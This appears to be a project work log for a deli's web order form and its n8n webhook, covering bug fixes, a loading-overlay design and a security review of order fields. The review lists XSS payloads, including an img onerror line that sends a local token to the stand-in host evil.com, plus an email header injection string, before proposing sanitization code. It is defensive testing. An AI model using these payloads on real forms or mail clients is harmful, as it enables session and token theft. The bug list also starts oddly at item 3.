Fix existing HTML order form to properly integrate with n8n webhook v1.

### What I Found
The form (`systack-site/niches/food/order-form.js`) had been built with assumptions that didn't match the webhook reality. 4 critical bugs would cause every order to fail or produce incorrect data.

3. **Business hours** — 10-8 vs actual 12:30-19:30 Mon-Sat, closed Sun
4. **Menu items** — Generic placeholders vs actual Utopia Deli Square catalog items
5. **Response parsing** — No JSON/Content-Type checking

## GENI: Loading State Visual Design — 3-Phase Overlay

### Task
Design loading states for order submission + payment link generation.

### What I Studied
- Current form (`systack-site/niches/food/index.html` + `order-form.js`)
- Form branding: navy `#001a2d`, teal `#007da9`, cyan `#00a1db`, card-based layout
- Current loading: disabled button with static text "Placing Order…"

### Problem
1. Button may be off-screen on mobile (form is long)
2. 3-8 second webhook call with zero visual feedback
3. No brand identity in loading state
4. Users may submit twice (no clear "we got it" signal)
5. Success message is weak: green box with checkmark emoji + raw URL

### Design: Loading Overlay Card

**Full-screen overlay:**
- Navy backdrop (`rgba(0,26,45,0.6)`) with `backdrop-filter: blur(4px)`
- White card centered, rounded (16px), max-width 380px
- Teal animated spinner ring
- Progress bar (teal gradient)
- 3 phase steps with numbered dots → checkmarks

**Phase progression:**
| Phase | Title | Subtitle | Progress |
|-------|-------|----------|----------|
| 1 | "Placing Your Order…" | "Checking your order details" | 15% |
| 2 | "Preparing Your Order…" | "Sending to the kitchen" | 50% |
| 3 | "Creating Payment Link…" | "Almost ready!" | 85% |
| Done | "Order Placed!" | "Redirecting to payment…" | 100% |

**CSS uses form's variables:** `--navy`, `--cyan`, `--teal`, `--gray-*`, `--green`

**HTML exists in DOM (not injected):**
- Hidden by default (`display:none` / `.active` class toggle)
- Scroll locked during loading
- Screen reader friendly

### Why This Beats Current

| Aspect | Current | NEW |
|--------|---------|-----|
| Visibility | May be off-screen | Centered, full-screen |
| Mobile | Worse | Optimized |
| Brand match | None | Navy + teal |
| Progress | Static text | 3 phases + bar |
| Feedback | None | Animated spinner |
| Duplicate submit | High risk | Blocked by overlay |
| Perceived wait | Feels longer | Steps reduce it |

### New Pitfalls
- **GENI-012:** Static button text = frozen site perception
- **GENI-013:** Loading state must be in HTML, not DOM-injected
- **GENI-014:** Progress steps reduce perceived wait time

## PESSI: Injection Attacks — XSS, JS Injection, Header Injection

### Task
Friday rotation: Find failure modes for XSS, JS injection, SQL/JS in order fields.

### Attack Vectors Tested

| # | Attack | Payload | Current Defense | Gap |
|---|--------|---------|-----------------|-----|
| 1 | XSS in customer_name | `\u003cscript\u003ealert(document.cookie)\u003c/script\u003e` | None | **CRITICAL** |
| 2 | Data exfiltration via img | `\u003cimg src=x onerror=fetch('evil.com?c='+localStorage.token)\u003e` | None | **CRITICAL** |
| 3 | Frame injection | `\u003ciframe src="javascript:alert(1)"\u003e` | None | **CRITICAL** |
| 4 | Email header injection | `victim@example.com\nBcc: spam@target.com` | None | MEDIUM |
| 5 | Persistent payload in Sheets | Any malicious JSON | None (raw stringify) | MEDIUM |

### What the Reference Does
- **Legacy Contact + Item + Cart:** Uses n8n form completion pages (not email HTML). Limited free-text injection surface.
- **Legacy Order Received:** Uses Handlebars templates but primarily for Square integration, not kitchen email.
- **Neither legacy workflow sends raw user content to kitchen staff via email** — the NEW webhook does.

### Why This Is Critical
The kitchen staff's email client (Gmail, Outlook, Apple Mail) **renders HTML by default**. A single malicious order with `\u003cscript\u003e` in `customer_name` or `special_instructions` executes JavaScript in the kitchen's browser when they open the order email. This could:
- Steal email session cookies
- Redirect to phishing pages
- Install malware
- Disrupt operations with fake "system error" popups

### The All-At-Once Problem
Legacy per-stage flow limits injection surface:
- Radio buttons/dropdowns = no free text
- Single field per stage = only one vector at a time
- Form engine may auto-escape some HTML

NEW webhook: ALL fields are free-form JSON. Attacker crafts complete malicious payload in one POST. Every field is a vector.

### Defense Design for NEW Webhook

**Required: Sanitization Code Node** (after validation, before all outputs):

```javascript
function sanitizeHtml(str) {
  return String(str)
    .replace(/\u0026/g, '\u0026amp;')
    .replace(/\u003c/g, '\u0026lt;')
    .replace(/\u003e/g, '\u0026gt;')
    .replace(/"/g, '\u0026quot;')
    .replace(/'/g, '\u0026#x27;')
    .replace(/\//g, '\u0026#x2F;');
}
function stripEventHandlers(str) {
  return str.replace(/\bon\w+\s*=/gi, 'data-blocked=');
}
// Apply before ANY output
body.customer_name = stripEventHandlers(sanitizeHtml(body.customer_name));
body.special_instructions = stripEventHandlers(sanitizeHtml(body.special_instructions));
body.email = body.email.replace(/[\r\n]/g, ''); // header injection prevention
for (const item of body.order_items) {
  item.name = stripEventHandlers(sanitizeHtml(item.name));
}
```

### New Pitfalls Added
- **PESSI-022:** No input sanitization before email embedding — CRITICAL
- **PESSI-023:** JSON.stringify logging stores attack payloads verbatim — MEDIUM
- **PESSI-024:** Email header injection via newlines — MEDIUM
